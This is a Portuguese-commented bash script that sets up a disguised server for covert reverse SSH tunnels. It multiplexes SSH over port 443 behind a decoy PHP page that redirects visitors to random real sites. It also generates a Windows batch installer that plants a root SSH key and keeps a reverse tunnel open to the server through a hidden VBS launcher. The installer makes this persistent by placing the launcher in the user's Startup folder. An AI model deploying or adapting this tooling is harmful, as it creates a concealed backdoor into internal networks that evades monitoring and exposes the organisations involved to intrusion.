#!/bin/bash

# Cores para interface
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
echo -e "${BLUE}======================================================${NC}"
echo -e "${BLUE}    GERADOR DE TUNNEL REVERSO - MODO CAMALEÃO        ${NC}"
echo -e "${BLUE}======================================================${NC}"

# 1. VERIFICAÇÃO DE ROOT
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[ERRO] Este script precisa rodar como ROOT.${NC}"
   exit 1
fi

# 2. DETECÇÃO DE IP PÚBLICO
echo -e "${YELLOW}[*] Detectando IPv4 Publico...${NC}"
PUBLIC_IP=$(curl -s -4 ifconfig.me || curl -s -4 icanhazip.com)
if [[ -z "$PUBLIC_IP" ]]; then
    echo -e "${RED}[ERRO] Falha ao detectar IP externo.${NC}"
    exit 1
fi
echo -e "${GREEN}    -> IP Encontrado: $PUBLIC_IP${NC}"

# 3. CONFIGURAÇÃO DE PORTAS
PORT_EXTERNA=443
PORT_SSH_LOCAL=22
PORT_HTTP_DISFARCE=8080
PORT_REVERSA_INTRANET=1080 

# 4. INSTALAÇÃO DE DEPENDÊNCIAS
echo -e "${YELLOW}[*] Instalando Apache, PHP e SSLH...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq sslh apache2 php libapache2-mod-php openssh-server curl > /dev/null

# 5. CONFIGURAÇÃO DO DISFARCE DINÂMICO (ROTATIVO)
echo -e "${YELLOW}[*] Configurando rotação aleatória de sites...${NC}"

# Configura porta do Apache
echo "Listen 127.0.0.1:$PORT_HTTP_DISFARCE" > /etc/apache2/ports.conf

# Cria o index.php Camaleão
rm -f /var/www/html/index.html
cat <<'EOF' > /var/www/html/index.php
<?php
$sites = [
    "https://www.google.com.br",
    "https://www.policiamilitar.sp.gov.br",
    "https://www.amazon.com.br",
    "https://www.mercadolivre.com.br",
    "https://www.youtube.com",
    "https://www.g1.globo.com",
    "https://www.gov.br/pt-br",
    "https://www.linkedin.com",
    "https://www.wikipedia.org"
];
$alvo = $sites[array_rand($sites)];
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <meta http-equiv="refresh" content="0;url=<?php echo $alvo; ?>">
</head>
<body style="background:#fff; font-family:sans-serif; text-align:center; padding-top:50px;">
    <p>Redirecionando para portal seguro...</p>
</body>
</html>
EOF

chown -R www-data:www-data /var/www/html/
systemctl restart apache2

# 6. CONFIGURAÇÃO DO SSLH
echo -e "${YELLOW}[*] Configurando SSLH (Porta $PORT_EXTERNA)...${NC}"
cat > /etc/default/sslh <<EOF
RUN=yes
DAEMON=/usr/sbin/sslh
DAEMON_OPTS="--user sslh --listen 0.0.0.0:$PORT_EXTERNA --ssh 127.0.0.1:$PORT_SSH_LOCAL --http 127.0.0.1:$PORT_HTTP_DISFARCE --pidfile /var/run/sslh/sslh.pid"
EOF
systemctl stop sslh
systemctl start sslh

# 7. AJUSTE SSHD (GATEWAY PORTS)
sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sed -i 's/GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
systemctl restart ssh

# 8. GERAÇÃO DO INSTALADOR WINDOWS (.BAT)
CLIENT_FILE="instalar_servico_intranet.bat"

cat <<EOF > $CLIENT_FILE
@echo off
title INSTALADOR TUNNEL SSH - STARTUP
setlocal enabledelayedexpansion

:: --- CONFIGURAÇÕES DO SERVIDOR (AUTO-GERADO) ---
set SERVER_IP=$PUBLIC_IP
set PORT=$PORT_EXTERNA
set USER_SSH=root
set FOLDER=%APPDATA%\SSHTunnel
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
:: -------------------------------------

echo [+] Criando pasta de trabalho em %FOLDER%...
if not exist "%FOLDER%" mkdir "%FOLDER%"

:: GESTAO DE CHAVE SSH (Necessário para o tunnel não pedir senha)
if not exist "%USERPROFILE%\.ssh\id_rsa" (
    echo [+] Gerando chave de identidade...
    ssh-keygen -t rsa -b 2048 -f "%USERPROFILE%\.ssh\id_rsa" -N "" -q
)

echo.
echo [!] AUTORIZACAO: Digite a senha do servidor para permitir conexao automatica.
echo.
type "%USERPROFILE%\.ssh\id_rsa.pub" | ssh -p %PORT% -o StrictHostKeyChecking=no %USER_SSH%@%SERVER_IP% "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

echo [+] Gerando script de conexao (tunnel.bat)...
(
echo @echo off
echo :LOOP
echo echo [%%date%% %%time%%] Iniciando conexao...
echo ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -p %PORT% -N -R $PORT_REVERSA_INTRANET:localhost:22 %USER_SSH%@%SERVER_IP%
echo echo [%%date%% %%time%%] Conexao caiu. Reiniciando em 10 segundos...
echo timeout /t 10 ^>nul
echo goto LOOP
) > "%FOLDER%\tunnel.bat"

echo [+] Gerando inicializador invisivel (start_tunnel.vbs)...
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "cmd.exe /c ""%FOLDER%\tunnel.bat""", 0, False
) > "%FOLDER%\start_tunnel.vbs"

echo [+] Configurando persistencia na pasta Inicializar...
copy /y "%FOLDER%\start_tunnel.vbs" "%STARTUP_FOLDER%\start_tunnel.vbs" >nul

echo.
echo ---------------------------------------------------
echo [+] INSTALACAO CONCLUIDA!
echo ---------------------------------------------------
echo [!] O tunnel agora inicia sozinho com o Windows.
echo [!] Local: %STARTUP_FOLDER%
echo.
echo Deseja iniciar a conexao agora em segundo plano? (S/N)
set /p opt=
if /i "%opt%"=="S" (
    start wscript.exe "%STARTUP_FOLDER%\start_tunnel.vbs"
    echo [+] Executando...
)

timeout /t 3
exit
EOF

# 9. RELATÓRIO FINAL
echo -e "${GREEN}======================================================${NC}"
echo -e " SERVIDOR CONFIGURADO COM SUCESSO"
echo -e "======================================================${NC}"
echo -e " Porta Externa: ${BLUE}$PORT_EXTERNA${NC} (HTTPS/Multiplexada)"
echo -e " Disfarce: ${BLUE}PHP Rotativo Ativado${NC}"
echo -e " Tunnel Reverso: Porta ${BLUE}$PORT_REVERSA_INTRANET${NC} no servidor"
echo -e "======================================================"
echo -e "${YELLOW}>>> ARQUIVO CLIENTE GERADO: $PWD/$CLIENT_FILE${NC}"
